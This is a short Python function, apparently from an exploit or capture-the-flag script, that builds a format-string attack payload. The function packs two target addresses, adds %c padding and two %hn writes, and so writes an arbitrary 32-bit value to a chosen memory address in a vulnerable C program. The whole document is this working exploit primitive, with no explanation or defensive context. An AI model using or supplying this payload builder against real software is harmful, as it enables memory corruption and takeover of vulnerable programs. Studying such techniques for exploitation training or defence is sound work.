def createFmt32( dest, src, offset, start=0 ):
  start +=8
  upper2 = (src >> 16) & 0xffff
  lower2 = src & 0xffff

  fmt = b''
  fmt += p32( dest )
  fmt += p32( dest + 2 )
  fmt += b'%%%dc'%( lower2-start )
  fmt += b'%%%d$hn'%offset
  fmt += b'%%%dc'%( upper2-lower2 if upper2>lower2 else upper2+(0x10000-lower2 ) )
  fmt += b'%%%d$hn'%(offset+1)
  return fmt

